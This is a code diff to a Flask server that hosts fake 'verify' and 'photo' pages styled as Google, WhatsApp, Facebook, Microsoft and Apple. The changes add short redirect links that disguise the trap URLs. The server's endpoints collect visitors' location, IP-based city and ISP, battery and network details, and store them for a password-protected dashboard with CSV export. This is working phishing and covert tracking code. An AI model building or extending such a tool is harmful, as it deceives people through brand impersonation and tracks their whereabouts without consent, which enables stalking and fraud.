@@ -6,7 +6,8 @@ from flask import (
     session,
     redirect,
     url_for,
-    Response,          # <-- THIS WAS MISSING – FIXES THE DEPLOY ERROR
+    Response,
+    abort,               # <-- Added for 404 handling
 )
 from flask_cors import CORS
 import os
@@ -22,7 +23,7 @@ CORS(app)
 # DATA STORAGE
 # =============================================
 
-users = {}  # { session_id: { "current": {...}, "history": [...] } }
+users = {}
 all_history = []
 
 latest_location = {
@@ -47,7 +48,6 @@ latest_location = {
 # =============================================
 
 def get_ip_info(ip):
-    """Fetch city, country, ISP from ip-api.com (free, no API key required)"""
     try:
         url = f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,lat,lon"
         response = requests.get(url, timeout=5)
@@ -64,25 +64,44 @@ def get_ip_info(ip):
         print(f"IP Geolocation error: {e}")
     return None
 
+# =============================================
+# BUILT-IN URL SHORTENER
+# =============================================
+
+VALID_BRANDS = ["google", "whatsapp", "facebook", "microsoft", "apple"]
+
+@app.route("/s/<brand>")
+def short_verify(brand):
+    """Short URL for verification: /s/google → /google/verify"""
+    if brand not in VALID_BRANDS:
+        abort(404)
+    return redirect(url_for("verify_trap_clean", brand=brand))
+
+@app.route("/sp/<brand>")
+def short_photo(brand):
+    """Short URL for photo trap: /sp/google → /google/photo"""
+    if brand not in VALID_BRANDS:
+        abort(404)
+    return redirect(url_for("photo_trap_clean", brand=brand))
 
 # =============================================
-# CLEAN URL ROUTES (Fixes the 404 error)
+# CLEAN URL ROUTES
 # =============================================
 
 @app.route("/<brand>/verify")
 def verify_trap_clean(brand):
-    """Clean URL for verification trap: /whatsapp/verify, /google/verify, etc."""
+    if brand not in VALID_BRANDS:
+        abort(404)
     return render_template("index.html", brand=brand)
-
 
 @app.route("/<brand>/photo")
 def photo_trap_clean(brand):
-    """Clean URL for photo trap: /whatsapp/photo, /google/photo, etc."""
+    if brand not in VALID_BRANDS:
+        abort(404)
     return render_template("photo.html", brand=brand)
 
-
 # =============================================
-# LEGACY ROUTES (Backward compatibility)
+# LEGACY ROUTES
 # =============================================
 
 @app.route("/")
@@ -90,19 +109,16 @@ def target_page():
     template = request.args.get("template", "google")
     return render_template("index.html", brand=None)
 
-
 @app.route("/photo")
 def photo_trap():
     template = request.args.get("template", "whatsapp")
     return render_template("photo.html", brand=None)
 
-
 # =============================================
 # DASHBOARD AUTHENTICATION
 # =============================================
 
-# 🔴 IMPORTANT: CHANGE THIS PASSWORD RIGHT NOW!
-DASHBOARD_PASSWORD = "your_strong_password"
+DASHBOARD_PASSWORD = "your_strong_password"  # 🔴 CHANGE THIS!
 
 @app.route("/dashboard-login", methods=["GET", "POST"])
 def dashboard_login():
@@ -112,13 +128,12 @@ def dashboard_login():
             return redirect(url_for("dashboard"))
         return "Wrong Password", 403
     return """
-        <form method="post" style="margin:20% auto;width:300px;text-align:center;font-family:Arial;">
+        <form method="post" style="margin:20%% auto;width:300px;text-align:center;font-family:Arial;">
             <h2>🔐 Admin Access</h2>
             <input type="password" name="password" placeholder="Enter Password" style="width:100%%;padding:10px;margin:10px 0;border-radius:4px;border:1px solid #ccc;">
             <button type="submit" style="padding:10px 30px;background:#4285f4;color:white;border:none;border-radius:4px;cursor:pointer;">Unlock</button>
         </form>
     """
-
 
 @app.route("/dashboard")
 def dashboard():
@@ -126,9 +141,8 @@ def dashboard():
         return redirect(url_for("dashboard_login"))
     return render_template("dashboard.html")
 
-
 # =============================================
-# API ENDPOINTS
+# API ENDPOINTS (unchanged)
 # =============================================
 
 @app.route("/send-location", methods=["POST"])
@@ -141,11 +155,9 @@ def receive_location():
     if not session_id:
         session_id = request.remote_addr or "unknown"
 
-    # Get real client IP (Render uses X-Forwarded-For)
     forwarded = request.headers.get("X-Forwarded-For")
     client_ip = forwarded.split(",")[0].strip() if forwarded else request.remote_addr
 
-    # Fetch IP info
     ip_info = get_ip_info(client_ip)
 
     location_data = {
@@ -160,7 +172,6 @@ def receive_location():
         "network": data.get("network"),
         "timestamp": datetime.now().isoformat(),
         "session_id": session_id,
-        # --- IP fields ---
         "ip": client_ip,
         "ip_city": ip_info.get("city") if ip_info else None,
         "ip_country": ip_info.get("country") if ip_info else None,
@@ -169,7 +180,6 @@ def receive_location():
         "ip_lon": ip_info.get("lon") if ip_info else None,
     }
 
-    # Store per user
     if session_id not in users:
         users[session_id] = {"current": location_data, "history": []}
     else:
@@ -190,7 +200,6 @@ def receive_location():
 
     return jsonify({"status": "ok", "session_id": session_id})
 
-
 @app.route("/send-battery", methods=["POST"])
 def receive_battery():
     data = request.get_json()
@@ -198,7 +207,6 @@ def receive_battery():
     if session_id and session_id in users:
         users[session_id]["current"]["battery"] = data
     return jsonify({"status": "ok"})
-
 
 @app.route("/send-network", methods=["POST"])
 def receive_network():
@@ -208,11 +216,9 @@ def receive_network():
         users[session_id]["current"]["network"] = data
     return jsonify({"status": "ok"})
 
-
 @app.route("/get-location")
 def get_location():
     return jsonify(latest_location)
-
 
 @app.route("/get-users")
 def get_users():
@@ -236,11 +242,9 @@ def get_users():
         )
     return jsonify(user_list)
 
-
 @app.route("/get-all-history")
 def get_all_history():
     return jsonify(all_history)
-
 
 @app.route("/clear", methods=["POST", "GET"])
 def clear_location():
@@ -264,7 +268,6 @@ def clear_location():
         "ip_isp": None,
     }
     return jsonify({"status": "cleared"})
-
 
 # =============================================
 # CSV EXPORT
@@ -303,7 +306,6 @@ def export_csv():
         mimetype="text/csv",
         headers={"Content-Disposition": "attachment;filename=locations.csv"},
     )
-
 
 # =============================================
 # RUN THE SERVER
